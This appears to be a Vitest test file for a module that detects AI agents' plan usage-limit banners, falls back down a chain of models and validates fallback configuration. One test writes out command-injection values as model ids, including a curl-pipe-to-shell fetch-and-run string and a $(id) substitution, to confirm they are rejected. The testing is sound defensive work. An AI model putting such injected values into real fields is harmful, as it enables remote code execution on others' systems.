import { describe, it, expect } from 'vitest'
import {
  detectsUsageLimit,
  nextFallbackModel,
  decideModelAction,
  normalizeModelFallbackConfig,
  weeklyTierIndex,
  sanitizeChain,
  parseModelFallbackUpdate,
  ModelFallbackConfigError,
  WEEKLY_TIER_DEADBAND,
  DEFAULT_MODEL_CHAIN,
  DEFAULT_MODEL_FALLBACK,
  DEFAULT_WEEKLY_TIER1_PERCENT,
  DEFAULT_WEEKLY_TIER2_PERCENT,
} from '../model-fallback.js'

const CHAIN = [...DEFAULT_MODEL_CHAIN]
const PRIMARY = CHAIN[0]
const SONNET = CHAIN[1]
const HAIKU = CHAIN[2]

describe('detectsUsageLimit', () => {
  it('matches Claude plan usage-limit banners in the live region', () => {
    expect(detectsUsageLimit('You have reached your usage limit. Try again later.')).toBe(true)
    expect(detectsUsageLimit('5-hour limit reached ∙ resets 3pm')).toBe(true)
    expect(detectsUsageLimit('Approaching usage limit')).toBe(true)
    expect(detectsUsageLimit('Your limit will reset at 18:00')).toBe(true)
  })

  it('does NOT match the /upgrade STARTUP HINT shown in fresh idle panes', () => {
    // Claude Code prints "/upgrade to increase your usage limit." as a slash-
    // command hint in every fresh session. Treating it as a real limit made the
    // whole fleet read as limited seconds after boot (2026-06-30 false positive).
    expect(detectsUsageLimit('/upgrade to increase your usage limit.')).toBe(false)
  })

  it('matches the SESSION-limit banner adopted from upstream (2026-08-08)', () => {
    // Card f085fd44. Production shows "You hit your session limit · resets 5:50pm", and no other
    // alternative in the pattern covers it: "resets 5:50pm" is not "limit will reset at". Before
    // this, a genuinely limited agent read as healthy and kept hammering a paused session.
    expect(detectsUsageLimit('You hit your session limit ∙ resets 5:50pm')).toBe(true)
    expect(detectsUsageLimit('You hit the session limit')).toBe(true)
  })

  it('keeps BOTH halves of the fork/upstream resolution at once', () => {
    // The two changes are independent and pull in opposite directions, so this pins them together:
    // taking upstream's file wholesale reintroduces the /upgrade false positive, keeping ours
    // wholesale drops the real session-limit detection. A future merge that resolves this file by
    // picking one side entirely turns this red instead of shipping quietly.
    expect(detectsUsageLimit('You hit your session limit ∙ resets 5:50pm')).toBe(true)
    expect(detectsUsageLimit('/upgrade to increase your usage limit.')).toBe(false)
  })

  it('matches the weekly and session wordings too', () => {
    // The owner asks about "the weekly or the 5-hour limit", so both have to be
    // caught; these three were measured silent before 2026-08-18.
    expect(detectsUsageLimit("You've reached your weekly limit for Opus.")).toBe(true)
    expect(detectsUsageLimit('Approaching Opus weekly limit ∙ 5% left')).toBe(true)
    expect(detectsUsageLimit('Session limit reached ∙ resets at 2am')).toBe(true)
  })

  it('does NOT match a transient API 429 / generic rate limit', () => {
    expect(detectsUsageLimit('  ⎿  API Error: 429 rate_limit_error: too many requests')).toBe(false)
    expect(detectsUsageLimit('  ⎿  API Error: 429 overloaded_error: server busy, retrying')).toBe(false)
  })

  it('ignores the phrase when it is only up in scrollback, not the live region', () => {
    const scrollback = ['you reached your usage limit', ...Array(40).fill('normal output line')].join('\n')
    expect(detectsUsageLimit(scrollback)).toBe(false)
  })

  it('returns false for empty / whitespace panes', () => {
    expect(detectsUsageLimit('')).toBe(false)
    expect(detectsUsageLimit('   \n  ')).toBe(false)
  })

  describe('shape guard (card 381b6f49): a live footer/busy chrome means healthy prose, not a real banner', () => {
    it('does NOT match when the phrase co-occurs with the live idle footer', () => {
      // A gate verdict, source comment, or card-text echo landing in the tail
      // region of an otherwise HEALTHY, idle session -- the normal footer is
      // still rendered underneath it.
      const pane = [
        'REVIEW: the detector matches "usage limit reached" in the tail region.',
        'bypass permissions on (shift+tab to cycle)',
      ].join('\n')
      expect(detectsUsageLimit(pane)).toBe(false)
    })

    it('does NOT match when the phrase co-occurs with a live token-counter busy indicator', () => {
      const pane = [
        'Quoting the source comment: "reached your usage limit" is the trigger.',
        'Thinking… (12s · ↓ 3.1k tokens · esc to interrupt)',
      ].join('\n')
      expect(detectsUsageLimit(pane)).toBe(false)
    })

    it('does NOT match when the phrase co-occurs with "esc to interrupt" alone', () => {
      const pane = [
        'the card says stop and wait for limit to reset before retrying',
        'bypass permissions on · esc to interrupt',
      ].join('\n')
      expect(detectsUsageLimit(pane)).toBe(false)
    })

    it('still matches a real paused banner, which has no footer to co-occur with', () => {
      // A genuine plan-limit pause replaces the footer with its own chrome
      // (store/quota-check.sh header: a numbered "1. Stop and wait..." modal) --
      // no idle footer, no busy indicator, ever renders alongside it.
      const pane = [
        'You have reached your usage limit. Try again later.',
        '1. Stop and wait for limit to reset',
        '2. Continue in a different session',
      ].join('\n')
      expect(detectsUsageLimit(pane)).toBe(true)
    })
  })
})

describe('nextFallbackModel', () => {
  it('walks one step down the chain', () => {
    expect(nextFallbackModel(PRIMARY, CHAIN)).toBe(SONNET)
    expect(nextFallbackModel(SONNET, CHAIN)).toBe(HAIKU)
  })
  it('returns null at the bottom', () => {
    expect(nextFallbackModel(HAIKU, CHAIN)).toBeNull()
  })
  it('treats an unknown current model as the primary', () => {
    expect(nextFallbackModel('some-unknown-model', CHAIN)).toBe(SONNET)
  })
  it('returns null for a degenerate chain', () => {
    expect(nextFallbackModel(PRIMARY, [PRIMARY])).toBeNull()
    expect(nextFallbackModel(PRIMARY, [])).toBeNull()
  })
})

describe('decideModelAction', () => {
  const base = { chain: CHAIN, now: 1_000_000, revertAfterMs: 60_000 }

  it('downgrades when a limit is detected and a lower model exists', () => {
    expect(decideModelAction({ ...base, limitDetected: true, currentModel: PRIMARY, downgradedAt: null }))
      .toEqual({ kind: 'downgrade', model: SONNET })
    expect(decideModelAction({ ...base, limitDetected: true, currentModel: SONNET, downgradedAt: 500_000 }))
      .toEqual({ kind: 'downgrade', model: HAIKU })
  })

  it('does nothing when limited at the bottom of the chain', () => {
    expect(decideModelAction({ ...base, limitDetected: true, currentModel: HAIKU, downgradedAt: 500_000 }))
      .toEqual({ kind: 'none' })
  })

  it('reverts to the primary after the window once limit-free', () => {
    expect(decideModelAction({ ...base, limitDetected: false, currentModel: HAIKU, downgradedAt: 1_000_000 - 60_000 }))
      .toEqual({ kind: 'revert', model: PRIMARY })
  })

  it('does not revert before the window elapses', () => {
    expect(decideModelAction({ ...base, limitDetected: false, currentModel: SONNET, downgradedAt: 1_000_000 - 59_999 }))
      .toEqual({ kind: 'none' })
  })

  it('does nothing when on the primary and limit-free', () => {
    expect(decideModelAction({ ...base, limitDetected: false, currentModel: PRIMARY, downgradedAt: null }))
      .toEqual({ kind: 'none' })
  })

  it('does not re-revert when already back on the primary', () => {
    expect(decideModelAction({ ...base, limitDetected: false, currentModel: PRIMARY, downgradedAt: 0 }))
      .toEqual({ kind: 'none' })
  })
})

describe('normalizeModelFallbackConfig', () => {
  it('defaults on junk input', () => {
    expect(normalizeModelFallbackConfig(null)).toEqual(DEFAULT_MODEL_FALLBACK)
    expect(normalizeModelFallbackConfig('nope')).toEqual(DEFAULT_MODEL_FALLBACK)
    expect(normalizeModelFallbackConfig({})).toEqual(DEFAULT_MODEL_FALLBACK)
  })

  it('honors a valid override', () => {
    const cfg = normalizeModelFallbackConfig({
      enabled: true, chain: ['a', 'b', 'c'], revertAfterMinutes: 120,
      weeklyTierEnabled: true, weeklyTier1Percent: 70, weeklyTier2Percent: 80,
    })
    expect(cfg).toEqual({
      enabled: true, chain: ['a', 'b', 'c'], revertAfterMinutes: 120,
      weeklyTierEnabled: true, weeklyTier1Percent: 70, weeklyTier2Percent: 80,
    })
  })

  it('rejects a too-short chain and non-string entries', () => {
    expect(normalizeModelFallbackConfig({ chain: ['only-one'] }).chain).toEqual(DEFAULT_MODEL_FALLBACK.chain)
    expect(normalizeModelFallbackConfig({ chain: ['a', 2, '', 'b'] }).chain).toEqual(['a', 'b'])
  })

  it('dedupes the chain (first occurrence wins)', () => {
    expect(normalizeModelFallbackConfig({ chain: ['a', 'a', 'b', 'a', 'c'] }).chain).toEqual(['a', 'b', 'c'])
    // A chain that dedupes below 2 falls back to the default.
    expect(normalizeModelFallbackConfig({ chain: ['a', 'a', 'a'] }).chain).toEqual(DEFAULT_MODEL_FALLBACK.chain)
  })

  it('rejects a non-positive revert window', () => {
    expect(normalizeModelFallbackConfig({ revertAfterMinutes: 0 }).revertAfterMinutes).toBe(DEFAULT_MODEL_FALLBACK.revertAfterMinutes)
    expect(normalizeModelFallbackConfig({ revertAfterMinutes: -5 }).revertAfterMinutes).toBe(DEFAULT_MODEL_FALLBACK.revertAfterMinutes)
  })

  it('defaults the weekly-tier fields (backward compat with pre-feature JSON)', () => {
    // A file written before this feature carries no weeklyTier* keys.
    const cfg = normalizeModelFallbackConfig({ enabled: true, chain: ['a', 'b'], revertAfterMinutes: 200 })
    expect(cfg.weeklyTierEnabled).toBe(false)
    expect(cfg.weeklyTier1Percent).toBe(DEFAULT_WEEKLY_TIER1_PERCENT)
    expect(cfg.weeklyTier2Percent).toBe(DEFAULT_WEEKLY_TIER2_PERCENT)
  })

  it('clamps weekly-tier percents to 1..100 integers', () => {
    // 0 is finite -> clamped up to the 1 floor (not the non-finite fallback).
    expect(normalizeModelFallbackConfig({ weeklyTier1Percent: 0 }).weeklyTier1Percent).toBe(1)
    // Non-finite junk -> the default.
    expect(normalizeModelFallbackConfig({ weeklyTier1Percent: 'x', weeklyTier2Percent: 88 }).weeklyTier1Percent).toBe(DEFAULT_WEEKLY_TIER1_PERCENT)
    expect(normalizeModelFallbackConfig({ weeklyTier1Percent: 200, weeklyTier2Percent: 300 })).toMatchObject({
      weeklyTier1Percent: DEFAULT_WEEKLY_TIER1_PERCENT, // 100 >= 100 -> both reset to defaults (tier1 < tier2 invariant)
      weeklyTier2Percent: DEFAULT_WEEKLY_TIER2_PERCENT,
    })
    expect(normalizeModelFallbackConfig({ weeklyTier1Percent: 40.6, weeklyTier2Percent: 60 }).weeklyTier1Percent).toBe(41)
  })

  it('resets both weekly percents when tier1 is not below tier2', () => {
    const cfg = normalizeModelFallbackConfig({ weeklyTier1Percent: 90, weeklyTier2Percent: 80 })
    expect(cfg.weeklyTier1Percent).toBe(DEFAULT_WEEKLY_TIER1_PERCENT)
    expect(cfg.weeklyTier2Percent).toBe(DEFAULT_WEEKLY_TIER2_PERCENT)
    // Equal is also invalid (tier1 must be strictly below tier2).
    expect(normalizeModelFallbackConfig({ weeklyTier1Percent: 80, weeklyTier2Percent: 80 }).weeklyTier1Percent)
      .toBe(DEFAULT_WEEKLY_TIER1_PERCENT)
  })
})

describe('sanitizeChain', () => {
  it('trims, drops empties/non-strings, and dedupes preserving order', () => {
    expect(sanitizeChain([' a ', 'a', '', 2, 'b', null, 'c', 'b'])).toEqual(['a', 'b', 'c'])
  })
  it('returns [] for a non-array', () => {
    expect(sanitizeChain('nope')).toEqual([])
    expect(sanitizeChain(null)).toEqual([])
  })
})

describe('weeklyTierIndex (thresholds + hysteresis)', () => {
  const cfg = { weeklyTier1Percent: 75, weeklyTier2Percent: 85 }
  // deadband is 3, so release happens at <72 (tier1) and <82 (tier2).

  it('climbs at the exact threshold from the primary', () => {
    expect(weeklyTierIndex(74, cfg, 0)).toBe(0)
    expect(weeklyTierIndex(75, cfg, 0)).toBe(1) // enters tier 1 at the threshold
    expect(weeklyTierIndex(84, cfg, 0)).toBe(1)
    expect(weeklyTierIndex(85, cfg, 0)).toBe(2) // jumps straight to tier 2
  })

  it('holds a tier inside the deadband (no flap just under the threshold)', () => {
    // Sitting at tier 1, % dips within the deadband (still >= 75-3=72) -> stays tier 1.
    expect(weeklyTierIndex(74, cfg, 1)).toBe(1)
    expect(weeklyTierIndex(73, cfg, 1)).toBe(1)
    expect(weeklyTierIndex(72, cfg, 1)).toBe(1) // exactly at 75-3, still held
    // Only once it drops BELOW the deadband floor does it release to primary.
    expect(weeklyTierIndex(71, cfg, 1)).toBe(0) // 71 < 72 -> release
  })

  it('applies the deadband to the tier-2 boundary too', () => {
    expect(weeklyTierIndex(83, cfg, 2)).toBe(2) // within deadband of 85
    expect(weeklyTierIndex(82, cfg, 2)).toBe(2) // exactly at 85-3, still tier 2
    expect(weeklyTierIndex(81, cfg, 2)).toBe(1) // 81 < 82 -> drop to tier 1
    // From tier 2, a big drop can fall through both boundaries at once.
    expect(weeklyTierIndex(71, cfg, 2)).toBe(0)
  })

  it('uses the up-threshold when climbing (no deadband on the way up)', () => {
    // At tier 0, 84 must NOT enter tier 2 even though 84 > 85-deadband.
    expect(weeklyTierIndex(84, cfg, 0)).toBe(1)
    // At tier 1 climbing to tier 2 requires the full 85 (boundary not yet crossed).
    expect(weeklyTierIndex(84, cfg, 1)).toBe(1)
    expect(weeklyTierIndex(85, cfg, 1)).toBe(2)
  })

  it('holds the current tier on an unknown/negative percent', () => {
    expect(weeklyTierIndex(-1, cfg, 2)).toBe(2)
    expect(weeklyTierIndex(NaN, cfg, 1)).toBe(1)
    expect(weeklyTierIndex(-1, cfg, 0)).toBe(0)
  })

  it('exposes a 3-point deadband constant', () => {
    expect(WEEKLY_TIER_DEADBAND).toBe(3)
  })
})

describe('parseModelFallbackUpdate (endpoint validation)', () => {
  it('accepts a valid chain including free-text (unknown) model IDs', () => {
    const out = parseModelFallbackUpdate({ chain: ['claude-future-9', 'my-local-model'] })
    expect(out.chain).toEqual(['claude-future-9', 'my-local-model'])
  })

  it('trims and dedupes an accepted chain', () => {
    expect(parseModelFallbackUpdate({ chain: [' a ', 'a', 'b'] }).chain).toEqual(['a', 'b'])
  })

  it('rejects a chain shorter than 2 after dedupe/trim', () => {
    expect(() => parseModelFallbackUpdate({ chain: ['only'] })).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ chain: ['a', 'a'] })).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ chain: ['a', '  '] })).toThrow(ModelFallbackConfigError)
  })

  it('rejects a non-array chain and non-string entries', () => {
    expect(() => parseModelFallbackUpdate({ chain: 'a,b' })).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ chain: ['a', 2] })).toThrow(ModelFallbackConfigError)
  })

  it('REJECTS a chain entry that is not a shell-safe model id (card b7fa5281)', () => {
    // A chain id is launched exactly like a per-agent model, so an unsafe entry is the same command-
    // injection path. It must 400 (ModelFallbackConfigError) rather than being stored.
    expect(() =>
      parseModelFallbackUpdate({ chain: ['claude-opus-5', "x'; curl http://a/x.sh | sh; echo '"] }),
    ).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ chain: ['claude-opus-5', 'a $(id)'] })).toThrow(
      ModelFallbackConfigError,
    )
    // The bracketed 1M-context default is still accepted (the allowlist includes []).
    expect(
      parseModelFallbackUpdate({ chain: ['claude-opus-4-8[1m]', 'claude-sonnet-5'] }).chain,
    ).toEqual(['claude-opus-4-8[1m]', 'claude-sonnet-5'])
  })

  it('validates weekly-tier percents and their ordering', () => {
    expect(parseModelFallbackUpdate({ weeklyTier1Percent: 70, weeklyTier2Percent: 80 }))
      .toEqual({ weeklyTier1Percent: 70, weeklyTier2Percent: 80 })
    expect(() => parseModelFallbackUpdate({ weeklyTier1Percent: 0 })).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ weeklyTier1Percent: 50.5 })).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ weeklyTier1Percent: 85, weeklyTier2Percent: 80 })).toThrow(ModelFallbackConfigError)
    expect(() => parseModelFallbackUpdate({ weeklyTier1Percent: 80, weeklyTier2Percent: 80 })).toThrow(ModelFallbackConfigError)
  })

  it('passes through the boolean toggles and only the present fields', () => {
    expect(parseModelFallbackUpdate({ weeklyTierEnabled: true, enabled: false }))
      .toEqual({ weeklyTierEnabled: true, enabled: false })
    expect(parseModelFallbackUpdate({})).toEqual({})
    // A non-true value coerces to false, never throws.
    expect(parseModelFallbackUpdate({ weeklyTierEnabled: 'yes' }).weeklyTierEnabled).toBe(false)
  })
})
